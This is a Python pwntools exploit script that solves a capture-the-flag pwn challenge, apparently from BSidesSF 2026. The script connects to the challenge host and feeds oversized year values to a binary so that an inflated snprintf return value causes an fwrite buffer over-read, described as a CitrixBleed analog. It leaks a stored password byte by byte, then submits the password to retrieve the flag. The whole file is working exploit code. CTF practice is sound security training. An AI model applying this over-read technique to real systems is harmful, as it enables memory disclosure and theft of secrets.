#!/usr/bin/env python3
"""
Challenge: if-it-leads
Category:  pwn
Platform:  BSidesSF 2026
Vuln:      snprintf return value inflation → fwrite buffer over-read (CitrixBleed analog)
"""
from pwn import *
import sys
import time

HOST = "if-it-leads-39d83b0e.challenges.bsidessf.net"
PORT = 4445

# Year values producing N+4 digit output from %04d → inflation of N
YEAR_FOR_INFLATION = {
    1: 99999,
    2: 999999,
    3: 9999999,
    4: 99999999,
    5: 999999999,
    6: 2147483647,
    7: -2147483648,
}

context.log_level = 'error'

def leak_password_byte(inflation):
    """Leak password[inflation-1] using snprintf return value inflation."""
    year = YEAR_FOR_INFLATION[inflation]
    p = remote(HOST, PORT, timeout=15)
    p.recvuntil(b'$ ', timeout=15)
    cmd = f'printf "wrong\\nA\\nB\\nC\\n{year}\\nD\\n-\\n" | ./if-it-leads 2>/dev/null | xxd | tail -1'
    p.sendline(cmd.encode())
    data = p.recvuntil(b'$ ', timeout=15)
    p.close()
    for line in data.decode('latin-1').split('\n'):
        if line.strip().startswith('0000'):
            hex_part = line.split(':')[1] if ':' in line else ''
            hex_bytes = hex_part.replace(' ', '')
            if hex_bytes:
                return bytes.fromhex(hex_bytes[-2:])
    return None

def get_flag(password):
    """Submit password and get flag."""
    p = remote(HOST, PORT, timeout=15)
    p.recvuntil(b'$ ', timeout=15)
    p.sendline(f'echo "{password}" | ./if-it-leads'.encode())
    data = p.recvuntil(b'$ ', timeout=15)
    p.close()
    return data.decode('latin-1', errors='replace')

# Phase 1: Leak password
print("[*] Leaking password byte by byte...")
password_chars = []
for i in range(1, 8):
    b = leak_password_byte(i)
    if b:
        c = b.decode('latin-1')
        password_chars.append(c)
        print(f"  password[{i-1}] = 0x{b.hex()} = {c!r}")
    else:
        print(f"  password[{i-1}] = FAILED")
        password_chars.append('?')
    time.sleep(1)

password = ''.join(password_chars)
print(f"\n[+] Password: {password}")

# Phase 2: Get flag
print("[*] Submitting password...")
result = get_flag(password)
for line in result.split('\n'):
    if 'CTF{' in line:
        print(f"[+] FLAG: {line.strip()}")
        break
else:
    print(result)
